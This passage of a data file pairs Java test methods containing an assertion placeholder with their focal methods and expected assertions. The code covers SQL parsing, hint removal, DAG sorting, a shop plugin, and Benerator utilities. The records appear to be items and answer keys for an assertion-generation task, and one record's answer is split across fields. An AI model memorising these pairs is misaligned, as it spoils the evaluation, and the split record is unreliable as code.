console(String input, SQLParserFeature... features) { try { StringBuffer buf = new StringBuffer();  List<SQLStatement> stmtList = SQLUtils.parseStatements(input, dbType, features);  for (SQLStatement stmt : stmtList) { if (stmt instanceof SQLShowColumnsStatement) { SQLShowColumnsStatement showColumns = ((SQLShowColumnsStatement) stmt); SQLName db = showColumns.getDatabase(); Schema schema; if (db == null) { schema = getDefaultSchema(); } else { schema = findSchema(db.getSimpleName()); }  SQLName table = null; SchemaObject schemaObject = null; if (schema != null) { table = showColumns.getTable(); schemaObject = schema.findTable(table.nameHashCode64()); }  if (schemaObject == null) { buf.append(""ERROR 1146 (42S02): Table '"" + table + ""' doesn't exist\n""); } else { MySqlCreateTableStatement createTableStmt = (MySqlCreateTableStatement) schemaObject.getStatement(); createTableStmt.showCoumns(buf); } } else if (stmt instanceof SQLShowCreateTableStatement) { SQLShowCreateTableStatement showCreateTableStmt = (SQLShowCreateTableStatement) stmt; SQLName table = showCreateTableStmt.getName(); SchemaObject schemaObject = findTable(table); if (schemaObject == null) { buf.append(""ERROR 1146 (42S02): Table '"" + table + ""' doesn't exist\n""); } else { MySqlCreateTableStatement createTableStmt = (MySqlCreateTableStatement) schemaObject.getStatement(); createTableStmt.output(buf); } } else if (stmt instanceof MySqlRenameTableStatement) { MySqlRenameTableStatement renameStmt = (MySqlRenameTableStatement) stmt; for (MySqlRenameTableStatement.Item item : renameStmt.getItems()) { renameTable(item.getName(), item.getTo()); } } else if (stmt instanceof SQLShowTablesStatement) { SQLShowTablesStatement showTables = (SQLShowTablesStatement) stmt; SQLName database = showTables.getDatabase();  Schema schema; if (database == null) { schema = getDefaultSchema(); } else { schema = findSchema(database.getSimpleName()); } if (schema != null) { for (String table : schema.showTables()) { buf.append(table); buf.append('\n'); } } } else { stmt.accept(consoleVisitor); } }  if (buf.length() == 0) { return ""\n""; }  return buf.toString(); } catch (IOException ex) { throw new FastsqlException(""exeucte command error."", ex); } }"	"assertEquals(""CREATE SEQUENCE pxc_seq_64056c9e413d6f79544c4938f86c8d6e START WITH 1 CACHE 100000"", object.getStatement().toString())"
"testFilterColumns() { String sqlInput = ""CREATE TABLE `omc_index_col_unique_test_gsi1` \n"" + ""( `a` int(11) NOT NULL,\n"" + "" `B` bigint(20) DEFAULT NULL, \n"" + "" `c` bigint(20) DEFAULT NULL, \n"" + "" PRIMARY KEY (`a`), \n"" + "" UNIQUE KEY `b` (`b`), \n"" + "" UNIQUE KEY `c` USING BTREE (`c`), \n"" + "" INDEX `idx_i` using btree(`B`),"" + "" UNIQUE KEY `b_zplr` \n"" + "" USING BTREE (`c`) ) ENGINE = InnoDB DEFAULT CHARSET = utf8mb4""; String sqlOutput = ""CREATE TABLE `omc_index_col_unique_test_gsi1` (\n"" + ""\t`a` int(11) NOT NULL,\n"" + ""\t`c` bigint(20) DEFAULT NULL,\n"" + ""\tPRIMARY KEY (`a`),\n"" + ""\tUNIQUE KEY `c` USING BTREE (`c`),\n"" + ""\tUNIQUE KEY `b_zplr` USING BTREE (`c`)\n"" + "") ENGINE = InnoDB DEFAULT CHARSET = utf8mb4"";  List<SQLStatement> statementList = SQLParserUtils.createSQLStatementParser(sqlInput, DbType.mysql, SQL_PARSE_FEATURES).parseStatementList(); MySqlCreateTableStatement createStmt = (MySqlCreateTableStatement) statementList.get(0); filterColumns(createStmt, Lists.newArrayList(""b"")); String result = createStmt.toString(); Assert.""<AssertPlaceHolder>""; }
filterColumns(MySqlCreateTableStatement stmt, List<String> toRemoveColumns) { if (!toRemoveColumns.isEmpty()) { Iterator<SQLTableElement> iterator = stmt.getTableElementList().iterator(); while (iterator.hasNext()) { SQLTableElement element = iterator.next(); if (element instanceof SQLColumnDefinition) { SQLColumnDefinition definition = (SQLColumnDefinition) element; String c1 = normalize(definition.getColumnName()); if (toRemoveColumns.contains(c1.toLowerCase())) { iterator.remove(); } } else if (element instanceof MySqlPrimaryKey) { MySqlPrimaryKey column = (MySqlPrimaryKey) element; List<SQLSelectOrderByItem> pks = column.getColumns(); for (SQLSelectOrderByItem pk : pks) { String name = getSqlName(pk.getExpr()); if (toRemoveColumns.contains(name.toLowerCase())) { iterator.remove(); break; } } } else if (element instanceof MySqlUnique) { MySqlUnique column = (MySqlUnique) element; List<SQLSelectOrderByItem> uks = column.getColumns(); for (SQLSelectOrderByItem uk : uks) { String name = getSqlName(uk.getExpr()); if (toRemoveColumns.contains(name.toLowerCase())) { iterator.remove(); break; } } } else if (element instanceof MySqlTableIndex) { MySqlTableIndex column = (MySqlTableIndex) element; List<SQLSelectOrderByItem> indexes = column.getColumns(); for (SQLSelectOrderByItem idx : indexes) { String name = getSqlName(idx.getExpr()); if (toRemoveColumns.contains(name.toLowerCase())) { iterator.remove(); break; } } } } } }"	assertEquals(sqlOutput, result)
"testTraversalOneByOne() { for (int i = 0; i < TEST_CASES.length; i++) { printTestHead(i); if (!HAS_CYCLES[i]) { // Output topological sorting result. System.out.print(""One by One: ""); StringBuilder oneByOneBuf = new StringBuilder(); TopologicalSorter sorterOne = TopologicalSorter.create(DAGS[i].clone()); sorterOne.init(); while (sorterOne.hasNext()) { DdlTask vertex = sorterOne.next(); oneByOneBuf.append(vertex).append("", ""); } String actualOneByOne = oneByOneBuf.substring(0, oneByOneBuf.length() - 2); System.out.println(actualOneByOne); Assert.""<AssertPlaceHolder>""; } else { System.out.println(""Found cycles, ignored.""); } printTestTail(i); } }
clone() { DirectedAcyclicGraph copy = DirectedAcyclicGraph.create();  // Create a map to store the original and copied vertex Map<Vertex, Vertex> vertexMap = new HashMap<>(this.vertexes.size());  for (Vertex vertex : this.vertexes) { Vertex copiedVertex = copy.addVertexIgnoreCheck(vertex.object); vertexMap.put(vertex, copiedVertex); }  for (Edge edge : this.edges) { Vertex copiedSourceVertex = vertexMap.get(edge.source); Vertex copiedTargetVertex = vertexMap.get(edge.target); copy.addEdgeIgnoreCheck(copiedSourceVertex, copiedTargetVertex); } return copy; }"	assertEquals(TEST_CASES[i].expectedOneByOne, actualOneByOne)
"testTraversalBatch() { for (int i = 0; i < TEST_CASES.length; i++) { printTestHead(i); if (!HAS_CYCLES[i]) { // Output batch topological sorting result. System.out.print(""Batch: ""); StringBuilder batchBuf = new StringBuilder(); TopologicalSorter sorterBatch = TopologicalSorter.create(DAGS[i].clone()); sorterBatch.init(); while (sorterBatch.hasNext()) { List<DdlTask> vertexes = sorterBatch.nextBatch(); batchBuf.append(""[""); for (DdlTask vertex : vertexes) { batchBuf.append(vertex).append("", ""); } int len = batchBuf.length(); batchBuf.delete(len - 2, len).append(""], ""); } String actualBatch = batchBuf.substring(0, batchBuf.length() - 2); System.out.println(actualBatch); Assert.""<AssertPlaceHolder>""; } else { System.out.println(""Found cycles, ignored.""); } printTestTail(i); } }
clone() { DirectedAcyclicGraph copy = DirectedAcyclicGraph.create();  // Create a map to store the original and copied vertex Map<Vertex, Vertex> vertexMap = new HashMap<>(this.vertexes.size());  for (Vertex vertex : this.vertexes) { Vertex copiedVertex = copy.addVertexIgnoreCheck(vertex.object); vertexMap.put(vertex, copiedVertex); }  for (Edge edge : this.edges) { Vertex copiedSourceVertex = vertexMap.get(edge.source); Vertex copiedTargetVertex = vertexMap.get(edge.target); copy.addEdgeIgnoreCheck(copiedSourceVertex, copiedTargetVertex); } return copy; }"	assertEquals(TEST_CASES[i].expectedBatch, actualBatch)
"testInject3() {  String key = ""key1"";  long start = System.currentTimeMillis();  FailPoint.enable(""key1"", ""value""); FailPoint.inject(key, () -> { try { Thread.sleep(3 * 1000); } catch (InterruptedException e) { e.printStackTrace(); } });  long end = System.currentTimeMillis();  Assert.""<AssertPlaceHolder>""; }
assertTrue(Supplier<Boolean> predicate) { inject(FP_ASSERT, () -> { if (predicate.get() != true) { throw new RuntimeException(""assert failed. expect true, actual false""); } }); }"	assertTrue((end - start) > 2500l)
"testRemoveTDDLHint() { for (String[] sqls : testSql) { String sql = sqls[0]; String sql2 = null; String sql1 = null; System.setProperty(ConnectionProperties.HINT_PARSER_FLAG, ""true""); String tddlHint = HintParser.getInstance().getTddlHint(ByteString.from(sql)); if (tddlHint != null && !"""".equalsIgnoreCase(tddlHint)) { sql1 = HintParser.getInstance().removeTDDLHint(ByteString.from(sql)).toString(); }  System.setProperty(ConnectionProperties.HINT_PARSER_FLAG, ""false""); tddlHint = HintParser.getInstance().getTddlHint(ByteString.from(sql)); if (tddlHint != null && !"""".equalsIgnoreCase(tddlHint)) { sql2 = HintParser.getInstance().removeTDDLHint(ByteString.from(sql)).toString(); } //            System.out.println(ByteString.from(sql)); //            System.out.println(sql1); //            System.out.println(sql2); Assert.""<AssertPlaceHolder>""; } }
removeTDDLHint(ByteString sql) { if (!containHint(sql)) { return sql; } boolean useParser = useHintParser(); if (!useParser) { sql = removeBetweenWithSplitor(sql, TDDL_HINT_PREFIX, TDDL_HINT_END); } else { ByteBuffer buffer = ByteBuffer.allocate(sql.length()); sql.getBytes(0, HintParser.getInstance().getTddlHintIndex(sql), buffer); buffer.put((byte) ' '); sql.getBytes(HintParser.getInstance().getTddlHintEndIndex(sql), sql.length(), buffer); sql = new ByteString(buffer.array(), 0, buffer.position(), sql.getCharset()); } return sql; }"	assertTrue(sql1 == sql2 || sql1.equalsIgnoreCase(sql2))
"testRemoveGroupHint() { for (String[] sqls : testSql) { String sql = sqls[0]; //            System.out.println(""orinal sql:"" + sql); String sql2 = null; String sql1 = null; System.setProperty(ConnectionProperties.HINT_PARSER_FLAG, ""true""); String tddlHint = HintParser.getInstance().getTddlGroupHint(ByteString.from(sql)); if (tddlHint != null && !"""".equalsIgnoreCase(tddlHint)) { sql1 = HintParser.getInstance().removeGroupHint(ByteString.from(sql)).toString(); } System.setProperty(ConnectionProperties.HINT_PARSER_FLAG, ""false""); tddlHint = HintParser.getInstance().getTddlGroupHint(ByteString.from(sql)); if (tddlHint != null && !"""".equalsIgnoreCase(tddlHint)) { sql2 = HintParser.getInstance().removeGroupHint(ByteString.from(sql)).toString(); } //            System.out.println(sql1); //            System.out.println(sql2); Assert.""<AssertPlaceHolder>"";  } }
removeGroupHint(ByteString sql) { if (!containHint(sql)) { return sql; } boolean useParser = useHintParser(); if (useParser) { ByteBuffer buffer = ByteBuffer.allocate(sql.length()); sql.getBytes(0, HintParser.getInstance().getTddlGroupHintIndex(sql), buffer); buffer.put((byte) ' '); sql.getBytes(HintParser.getInstance().getTddlGroupHintEndIndex(sql), sql.length(), buffer); sql = new ByteString(buffer.array(), 0, buffer.position(), sql.getCharset()); } else { sql = removeBetweenWithSplitor(sql, ""/*+TDDL_GROUP({"", ""})*/""); } return sql; }"	assertTrue(sql1 == sql2 || sql1.equalsIgnoreCase(sql2))
"testReplaceSimpleHint() { for (String[] sqls : testSql) { String sql = sqls[0]; System.setProperty(ConnectionProperties.HINT_PARSER_FLAG, ""true""); String hint = HintParser.getInstance().getTddlSimpleHint(ByteString.from(sql)); String sql2 = null; String sql1 = null; if (!TStringUtil.isEmpty(hint)) { String newHint = ""xxx""; sql1 = HintParser.getInstance().exchangeSimpleHint(hint, newHint, ByteString.from(sql)).toString(); } System.setProperty(ConnectionProperties.HINT_PARSER_FLAG, ""false""); hint = HintParser.getInstance().getTddlSimpleHint(ByteString.from(sql)); if (!TStringUtil.isEmpty(hint)) { String newHint = ""xxx""; sql2 = HintParser.getInstance().exchangeSimpleHint(hint, newHint, ByteString.from(sql)).toString();  } //            System.out.println(sql1); //            System.out.println(sql2); Assert.""<AssertPlaceHolder>"";  } }
exchangeSimpleHint(String oldHint, String newHint, ByteString sql) { if (!containHint(sql)) { return sql; } boolean useParser = useHintParser(); if (!useParser) { sql = replace(sql, ""/!TDDL:"", ""/*TDDL:""); if (!TStringUtil.isEmpty(newHint)) { sql = replaceOnce(sql, ""/*TDDL:"" + oldHint + ""*/"", newHint); } else { sql = removeBetweenWithSplitor(sql, ""/*TDDL:"", ""*/""); } return sql; }  int oldHintIndex = HintParser.getInstance().getTddlSimpleHintIndex(sql); int oldHintEndIndex = HintParser.getInstance().getTddlSimpleHintEndIndex(sql);  ByteBuffer buffer = ByteBuffer.allocate(sql.length() + (newHint != null ? newHint.length() : 1)); sql.getBytes(0, oldHintIndex, buffer); if (!TStringUtil.isEmpty(newHint)) { buffer.put(newHint.getBytes()); } else { buffer.put((byte) ' '); } sql.getBytes(oldHintEndIndex, sql.length(), buffer); return new ByteString(buffer.array(), 0, buffer.position(), sql.getCharset()); }"	assertTrue(sql1 == sql2 || sql1.equalsIgnoreCase(sql2))
"testFormatParameter_Null() { String nullValue = RawSqlUtils.formatParameter(null); ""<AssertPlaceHolder>""; }
formatParameter(Object value) { StringBuilder sb = new StringBuilder(); formatParameter(value, sb); return sb.toString(); }"	"assertEquals(""NULL"", nullValue)"
"testFormatParameter_Boolean() { String booleanVaue = RawSqlUtils.formatParameter(true); ""<AssertPlaceHolder>""; }
formatParameter(Object value) { StringBuilder sb = new StringBuilder(); formatParameter(value, sb); return sb.toString(); }"	"assertEquals(""1"", booleanVaue)"
"testFormatParameter_Number() { String numberValue = RawSqlUtils.formatParameter(123); ""<AssertPlaceHolder>""; }
formatParameter(Object value) { StringBuilder sb = new StringBuilder(); formatParameter(value, sb); return sb.toString(); }"	"assertEquals(""123"", numberValue)"
"testFormatParameter_BigDecimal() { String numberValue = RawSqlUtils.formatParameter(new BigDecimal(""1234567.89"")); ""<AssertPlaceHolder>""; }
formatParameter(Object value) { StringBuilder sb = new StringBuilder(); formatParameter(value, sb); return sb.toString(); }"	"assertEquals(""1234567.89"", numberValue)"
"testFormatParameter_String() { String stringValue = RawSqlUtils.formatParameter(""tddl5""); ""<AssertPlaceHolder>""; }
formatParameter(Object value) { StringBuilder sb = new StringBuilder(); formatParameter(value, sb); return sb.toString(); }"	"assertEquals(""'tddl5'"", stringValue)"
"testFormatParameter_Date() { String dateValue = RawSqlUtils.formatParameter(new Date(1512366731000L)); ""<AssertPlaceHolder>""; }
formatParameter(Object value) { StringBuilder sb = new StringBuilder(); formatParameter(value, sb); return sb.toString(); }"	"assertEquals(""'2017-12-04'"", dateValue)"
"testFormatParameter_Time() { String dateValue = RawSqlUtils.formatParameter(new Time(1512366731000L)); ""<AssertPlaceHolder>""; }
formatParameter(Object value) { StringBuilder sb = new StringBuilder(); formatParameter(value, sb); return sb.toString(); }"	"assertEquals(""'05:52:11'"", dateValue)"
"testFormatParameter_Timestamp() { String dateValue = RawSqlUtils.formatParameter(new Timestamp(1512366731000L)); ""<AssertPlaceHolder>""; }
formatParameter(Object value) { StringBuilder sb = new StringBuilder(); formatParameter(value, sb); return sb.toString(); }"	"assertEquals(""'2017-12-04 05:52:11.000'"", dateValue)"
"testFormatParameter_ByteArray() { String dateValue = RawSqlUtils.formatParameter(""hello"".getBytes()); ""<AssertPlaceHolder>""; }
formatParameter(Object value) { StringBuilder sb = new StringBuilder(); formatParameter(value, sb); return sb.toString(); }"	"assertEquals(""X'68656C6C6F'"", dateValue)"
"setUserShouldStoreNewUser() { User user = dataService.getUser(); user.firstName = ""Jane""; dataService.setUser(user); user = null; User user2 = dataService.getUser(); ""<AssertPlaceHolder>""; }
getUser() { return appData.user; }"	"assertEquals(""Jane"", user2.firstName)"
"setUserPictureShouldStorePicture() { User user = dataService.getUser(); user.image = ""testimage""; dataService.setUser(user); user = null;  User user2 = dataService.getUser(); ""<AssertPlaceHolder>""; }
getUser() { return appData.user; }"	"assertEquals(""testimage"",user2.image)"
"getUserPictureShouldReturnPicture() { User user = dataService.getUser(); ""<AssertPlaceHolder>""; }
getUser() { return appData.user; }"	"assertEquals(""defaultimage"",user.image)"
"getUserPictureShouldReturnPicture() { ShopAPIPlugin plugin = new ShopAPIPlugin(); plugin.setBridge(bridge); plugin.getUserPicture(call);  ArgumentCaptor<JSObject> argument = ArgumentCaptor.forClass(JSObject.class); verify(call).resolve(argument.capture()); ""<AssertPlaceHolder>"";base64,storedimagebase64"", argument.getValue().getString(""picture"")); }
getUserPicture(PluginCall call) { User user = dataService.getUser(); if (user.image != null && !user.image.isEmpty()) { String picture = user.getImageBase64(getContext()); if (picture != null) { JSObject returnPicture = new JSObject(); returnPicture.put(""picture"", picture); call.resolve(returnPicture); return; } }  call.reject(""No picture available""); }"	"assertEquals(""data:image/jpeg"
"setUserPictureShouldStorePicture() { when(call.getString(""picture"")).thenReturn(""user-image.jpg"");  ShopAPIPlugin plugin = new ShopAPIPlugin(); plugin.setBridge(bridge); plugin.setUserPicture(call);  ""<AssertPlaceHolder>""; }
setUserPicture(PluginCall call) { String picture = call.getString(""picture""); if (picture != null && !picture.isEmpty()) { User user = dataService.getUser(); dataService.storeUserImage(getContext(), user, picture); dataService.setUser(user); } call.resolve(); }"	"assertEquals(""user-image.jpg"", DataService.getInstance(context).getUser().image)"
"getCartShouldReturnCart() { ShopAPIPlugin plugin = new ShopAPIPlugin(); plugin.getCart(call);  ArgumentCaptor<JSObject> argument = ArgumentCaptor.forClass(JSObject.class); verify(call).resolve(argument.capture()); ""<AssertPlaceHolder>""; }
getCart(PluginCall call) { try { Cart cart = EcommerceApp.getInstance().getShoppingCart().getCart(); String cartJson = new Gson().toJson(cart); JSObject cartJSObject = JSObject.fromJSONObject(new JSONObject(cartJson)); call.resolve(cartJSObject); } catch (JSONException e) { call.reject(""error decoding cart object""); } }"	"assertEquals(""1"", argument.getValue().getString(""id""))"
"getUserDetailsShouldReturnDetails() { ShopAPIPlugin plugin = new ShopAPIPlugin(); plugin.getUserDetails(call);  ArgumentCaptor<JSObject> argument = ArgumentCaptor.forClass(JSObject.class); verify(call).resolve(argument.capture()); JSObject resultCheck = argument.getValue(); ""<AssertPlaceHolder>""; }
getUserDetails(PluginCall call) { try { User user = dataService.getUser(); String userJson = new Gson().toJson(user); JSObject userJSObject = JSObject.fromJSONObject(new JSONObject(userJson)); call.resolve(userJSObject); } catch (JSONException e) { call.reject(""error decoding user object""); } }"	"assertEquals(""mock - Josh"", argument.getValue().getString(""firstName""))"
"getCartShouldReturnCart() { Cart cart = shoppingCart.getCart();  ""<AssertPlaceHolder>""; }
getCart() { Cart cart = new Cart(); cart.id = 1; for(Map.Entry<Product, Integer> entry : contents.entrySet()) { Product product = entry.getKey(); int quantity = entry.getValue(); CartItem cartItem = new CartItem(); cartItem.productId = product.id; cartItem.quantity = quantity; cart.subTotal += product.price * quantity; cart.basket.add(cartItem); } return cart; }"	assertNotNull(cart)
"addingItemToCartShouldCalcSubTotal() { Product product = new Product(); product.id = 1; product.price = 5; shoppingCart.addItem(product, 1); Cart cart = shoppingCart.getCart();  ""<AssertPlaceHolder>""; }
getCart() { Cart cart = new Cart(); cart.id = 1; for(Map.Entry<Product, Integer> entry : contents.entrySet()) { Product product = entry.getKey(); int quantity = entry.getValue(); CartItem cartItem = new CartItem(); cartItem.productId = product.id; cartItem.quantity = quantity; cart.subTotal += product.price * quantity; cart.basket.add(cartItem); } return cart; }"	assertEquals(5, cart.subTotal, 0)
"addingTwoOfSameItemToCartShouldCalcSubTotal() { Product product = new Product(); product.id = 1; product.price = 5; shoppingCart.addItem(product, 2); Cart cart = shoppingCart.getCart();  ""<AssertPlaceHolder>""; }
getCart() { Cart cart = new Cart(); cart.id = 1; for(Map.Entry<Product, Integer> entry : contents.entrySet()) { Product product = entry.getKey(); int quantity = entry.getValue(); CartItem cartItem = new CartItem(); cartItem.productId = product.id; cartItem.quantity = quantity; cart.subTotal += product.price * quantity; cart.basket.add(cartItem); } return cart; }"	assertEquals(10, cart.subTotal, 0)
"testChain() { for (int n = MIN_INPUTS; n <= MAX_INPUTS; n++) { var topology = new JoinEnumerator(); for (int i = 1; i < n; i++) { topology.addJoinCondition(table(i-1), table(i)); } long expected = (long)Math.pow(2, n-1) * catalan(n - 1); ""<AssertPlaceHolder>""; } }
count() { if (inputCount() == 1) { return 1; }  // Clear the state. digestToInputs.clear(); connected.clear();  // Generate leaf orders. List<List<Integer>> orders = generateLeafOrders(); assert orders.size() == JoinEnumeratorUtils.fact(inputCount());  // Generate associations. Set<Join> templates = generateJoinTemplates(); assert templates.size() == JoinEnumeratorUtils.catalan(inputCount() - 1);  // Combine leaf orders and associations. AtomicLong counter = new AtomicLong(); CountDownLatch doneLatch = new CountDownLatch(orders.size() * templates.size()); for (List<Integer> order : orders) { for (Join template : templates) { checkConnectedAsync(order, template, counter, doneLatch); } }  // Await completion. try { doneLatch.await(); } catch (InterruptedException e) { Thread.currentThread().interrupt(); throw new RuntimeException(""Interrupted"", e); }  return counter.get(); }"	assertEquals(expected, topology.count())
"testStar() { for (int n = MIN_INPUTS; n <= MAX_INPUTS; n++) { var topology = new JoinEnumerator(); for (int i = 1; i < n; i++) { topology.addJoinCondition(table(0), table(i)); } long expected = (long)Math.pow(2, n-1) * fact(n - 1); ""<AssertPlaceHolder>""; } }
count() { if (inputCount() == 1) { return 1; }  // Clear the state. digestToInputs.clear(); connected.clear();  // Generate leaf orders. List<List<Integer>> orders = generateLeafOrders(); assert orders.size() == JoinEnumeratorUtils.fact(inputCount());  // Generate associations. Set<Join> templates = generateJoinTemplates(); assert templates.size() == JoinEnumeratorUtils.catalan(inputCount() - 1);  // Combine leaf orders and associations. AtomicLong counter = new AtomicLong(); CountDownLatch doneLatch = new CountDownLatch(orders.size() * templates.size()); for (List<Integer> order : orders) { for (Join template : templates) { checkConnectedAsync(order, template, counter, doneLatch); } }  // Await completion. try { doneLatch.await(); } catch (InterruptedException e) { Thread.currentThread().interrupt(); throw new RuntimeException(""Interrupted"", e); }  return counter.get(); }"	assertEquals(expected, topology.count())
"testClique() { for (int n = MIN_INPUTS; n <= MAX_INPUTS; n++) { var topology = new JoinEnumerator(); for (int i = 0; i < n; i++) { for (int j = 0; j < n; j++) { if (i == j) { continue; } topology.addJoinCondition(table(i), table(j)); } } long expected = fact(n) * catalan(n - 1); ""<AssertPlaceHolder>""; } }
count() { if (inputCount() == 1) { return 1; }  // Clear the state. digestToInputs.clear(); connected.clear();  // Generate leaf orders. List<List<Integer>> orders = generateLeafOrders(); assert orders.size() == JoinEnumeratorUtils.fact(inputCount());  // Generate associations. Set<Join> templates = generateJoinTemplates(); assert templates.size() == JoinEnumeratorUtils.catalan(inputCount() - 1);  // Combine leaf orders and associations. AtomicLong counter = new AtomicLong(); CountDownLatch doneLatch = new CountDownLatch(orders.size() * templates.size()); for (List<Integer> order : orders) { for (Join template : templates) { checkConnectedAsync(order, template, counter, doneLatch); } }  // Await completion. try { doneLatch.await(); } catch (InterruptedException e) { Thread.currentThread().interrupt(); throw new RuntimeException(""Interrupted"", e); }  return counter.get(); }"	assertEquals(expected, topology.count())
"testEncodeAsString() { AbstractEntityEncoder e = createEntityEncoder(); String s = e.encodeEntityAsString(createEntity()); ""<AssertPlaceHolder>""; }
encodeEntityAsString(Entity entity) { return StringUtil.toString(encodeEntityAsBytes(entity), encoding); }"	"assertEquals(""person[name=Otto]"", s)"
"testEncodeAsBytes() { AbstractEntityEncoder e = createEntityEncoder(); byte[] actualBytes = e.encodeEntityAsBytes(createEntity()); byte[] expectedBytes = new byte[] { 112, 101, 114, 115, 111, 110, 91, 110, 97, 109, 101, 61, 79, 116, 116, 111, 93 }; ""<AssertPlaceHolder>""; }
encodeEntityAsBytes(Entity entity) { return StringUtil.toBytes(encodeEntityAsString(entity), encoding); }"	assertArrayEquals(expectedBytes, actualBytes)
"testisEEAvailable() { ""<AssertPlaceHolder>""; }
isEEAvailable() { try { Class.forName(EE_BENERATOR); return true; } catch (ClassNotFoundException e) { return false; } }"	assertFalse(BeneratorUtil.isEEAvailable())
"testCheckSystem() { BufferedTextPrinter p = new BufferedTextPrinter(); BeneratorUtil.checkSystem(p); ""<AssertPlaceHolder>""; }
checkSystem(TextPrinter printer) { // print general Benerator version and system information printer.printStd(BeneratorFactory.getInstance().getVersionInfo(true)); // Check logging setup checkSlf4jSetup(); checkLog4j2Setup(); // Print heap info printer.printStd(""Configured heap size limit: "" + Runtime.getRuntime().maxMemory() / 1024 / 1024 + "" MB""); // Check script engine try { Class.forName(""javax.script.ScriptEngine""); } catch (ClassNotFoundException e) { configLogger.error(""You need to run benerator with Java 6 or greater!""); if (SystemInfo.isMacOsx()) { configLogger.error(""Please check the manual for Java setup on Mac OS X.""); } System.exit(BeneratorConstants.EXIT_CODE_ERROR); } // Check Java version VersionNumber javaVersion = VersionNumber.valueOf(VMInfo.getJavaVersion()); if (javaVersion.compareTo(VersionNumber.valueOf(""11.0"")) < 0) { configLogger.warn(""Benerator is written for and tested with Java 11. "" + ""If you are facing issues, please run Benerator with a Java VM of version 11 or newer.""); } // Check profiling setting if (Profiling.isEnabled()) { configLogger.warn(""Profiling is active. This may lead to memory issues""); } }"	"assertTrue(p.toString().startsWith(""Benerator ""))"
"testGetJVMInfo() { ""<AssertPlaceHolder>""; }
getJVMInfo() { return VMInfo.getJavaVmName() + "" "" + VMInfo.getJavaVmVersion() + "" ("" + VMInfo.getJavaVmVendor() + "")""; }"	assertTrue(BeneratorUtil.getJVMInfo().startsWith(VMInfo.getJavaVmName()))
"getCpuAndMemInfo() { int availableProcessors = Runtime.getRuntime().availableProcessors(); ""<AssertPlaceHolder>""; }
getCpuAndMemInfo() { int availableProcessors = Runtime.getRuntime().availableProcessors(); String result = availableProcessors + "" cores""; long memGb = getMemGB(); if (memGb > 0) { result += "" and "" + memGb + "" GB RAM""; } long maxMemMB = Runtime.getRuntime().maxMemory() / 1024 / 1024; if (maxMemMB >= 1024) result += "", max "" + (maxMemMB / 1024) + "" GB of RAM for this process""; else result += "", max "" + maxMemMB + "" MB of RAM for this process""; return result; }"	"assertTrue(BeneratorUtil.getCpuAndMemInfo().startsWith(availableProcessors + "" cores""))"
"testGetMemGB() { ""<AssertPlaceHolder>""; }
getMemGB() { try { MBeanServer mBeanServer = ManagementFactory.getPlatformMBeanServer(); ObjectName osName = new ObjectName(""java.lang"", ""type"", ""OperatingSystem""); return ((int) ((Long) mBeanServer.getAttribute(osName, ""TotalPhysicalMemorySize"") / 1024 / 1024 / 1024)); } catch (Exception e) { e.printStackTrace(); return -1; } }"	assertTrue(BeneratorUtil.getMemGB() > 0)
"testGetOsInfo() { ""<AssertPlaceHolder>""; }
getOsInfo() { return SystemInfo.getOsName() + "" "" + SystemInfo.getOsVersion() + "" "" + SystemInfo.getOsArchitecture(); }"	assertTrue(BeneratorUtil.getOsInfo().startsWith(SystemInfo.getOsName()))
"testPrintEnvironments() { BeneratorUtil.printEnvironments(); ""<AssertPlaceHolder>""; }
printEnvironments() { ConsolePrinter.printStandard(formatEnvironmentList()); }"	assertTrue(true)
"testPrintEnvDbs() { TextPrinter printer = new BufferedTextPrinter(); BeneratorUtil.printEnvDbs(printer); ""<AssertPlaceHolder>""; }
printEnvDbs(TextPrinter printer) { printEnvSystems(""Databases"", ""db"", printer); }"	assertTrue(printer.toString().length() > 0)
"testPrintEnvKafkas() { TextPrinter printer = new BufferedTextPrinter(); BeneratorUtil.printEnvKafkas(printer); ""<AssertPlaceHolder>""; }
printEnvKafkas(TextPrinter printer) { printEnvSystems(""Kafkas"", ""kafka"", printer); }"	assertTrue(printer.toString().length() > 0)
"Exception { Method stringMethod = getClass().getDeclaredMethod(""uniqueMethod"", String.class); @SuppressWarnings(""resource"") BeneratorContext context = new DefaultBeneratorContext(); AnnotationMapper mapper = new AnnotationMapper(context.getDataModel(), new DefaultPathResolver()); MethodDescriptor stringMethodDescriptor = new MethodDescriptor(stringMethod); ArrayTypeDescriptor type = mapper.createMethodParamsType(stringMethodDescriptor); InstanceDescriptor arrayDescriptor = mapper.createMethodParamsInstanceDescriptor(stringMethodDescriptor, type); ""<AssertPlaceHolder>""; }
createMethodParamsInstanceDescriptor( MethodDescriptor testMethod, ArrayTypeDescriptor type) { InstanceDescriptor instance = new InstanceDescriptor(testMethod.getName(), this, type); for (Annotation annotation : testMethod.getAnnotations()) { mapParamAnnotation(annotation, instance, testMethod.getDeclaringClass()); } return instance; }"	assertEquals(true, arrayDescriptor.isUnique())
"testConstructor() { ""<AssertPlaceHolder>""; }
toString() { return getClass().getSimpleName() + '[' + length + ']'; }"	"assertEquals(""BlankArrayGenerator[3]"", (new BlankArrayGenerator(3)).toString())"
"testToString() { ""<AssertPlaceHolder>""; }
toString() { return getClass().getSimpleName() + '[' + length + ']'; }"	"assertEquals(""BlankArrayGenerator[3]"", (new BlankArrayGenerator(3)).toString())"
"testConvertNull() { ""<AssertPlaceHolder>""; }
convert(Entity entity) throws ConversionException { return convert(entity, type); }"	assertNull(converter.convert(null))
"testToString() { ""<AssertPlaceHolder>""; }
toString() { return getClass().getSimpleName() + ""["" + type + ""]""; }"	"assertEquals(""ComponentTypeConverter[parentType[child[details=[], type=childType["" + ""child[details=[type=string], type=string[]]]], list[details=[], type=childType[]], "" + ""array[details=[], type=childType[]]]]"", converter.toString())"
"test() { ConsumerMock target = new ConsumerMock(); MappingEntityConsumer consumer = new MappingEntityConsumer(); try { consumer.setTarget(target); consumer.setMappings(""'name'->'givenName', 'none'->'some'"");  Entity input = createEntity(""Person"", ""name"", ""Alice"", ""age"", 23); consumer.startConsuming(new ProductWrapper<Entity>().wrap(input)); consumer.finishConsuming(new ProductWrapper<Entity>().wrap(input)); ""<AssertPlaceHolder>""; } finally { IOUtil.close(consumer); }  }
finishConsuming(ProductWrapper<?> wrapper) { super.finishConsuming(((ProductWrapper) wrapper).wrap(stack.pop())); }"	"assertEquals(createEntity(""Person"", ""givenName"", ""Alice"", ""age"", 23), target.lastProduct)"
"testNull() { Append a = new Append(); ""<AssertPlaceHolder>""; }
convert(Object sourceValue) throws ConversionException { if (sourceValue == null) { return null; } String string = ToStringConverter.convert(sourceValue, null); return string + suffix; }"	assertNull(a.convert(null))
"test_null() { CutLength c = new CutLength(5); ""<AssertPlaceHolder>""; }
